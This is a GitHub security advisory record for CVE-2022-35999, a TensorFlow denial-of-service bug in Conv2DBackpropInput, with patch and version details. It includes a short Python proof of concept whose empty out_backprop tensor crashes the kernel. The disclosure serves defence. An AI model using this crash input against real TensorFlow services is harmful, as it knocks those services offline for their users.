{
    "ghsaId": "GHSA-37jf-mjv6-xfqw",
    "severity": "MODERATE",
    "summary": "TensorFlow vulnerable to `CHECK` fail in `Conv2DBackpropInput`",
    "description": "### Impact\nWhen `Conv2DBackpropInput` receives empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current CPU/GPU kernels `CHECK` fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\ninput_sizes = [3, 1, 1, 2]\nfilter = np.ones([1, 3, 2, 3])\nout_backprop = np.ones([3, 1, 0, 3])\nstrides = [1, 1, 2, 1]\npadding = 'VALID'\n\ntf.raw_ops.Conv2DBackpropInput(\n   input_sizes = input_sizes,\n   filter = filter,\n   out_backprop = out_backprop,\n   strides = strides,\n   padding = padding\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [27a65a43cf763897fecfa5cdb5cc653fc5dd0346](https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n",
    "permalink": "https://github.com/advisories/GHSA-37jf-mjv6-xfqw",
    "publishedAt": "2022-09-16T19:24:49Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-37jf-mjv6-xfqw"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-35999"
        }
    ]
}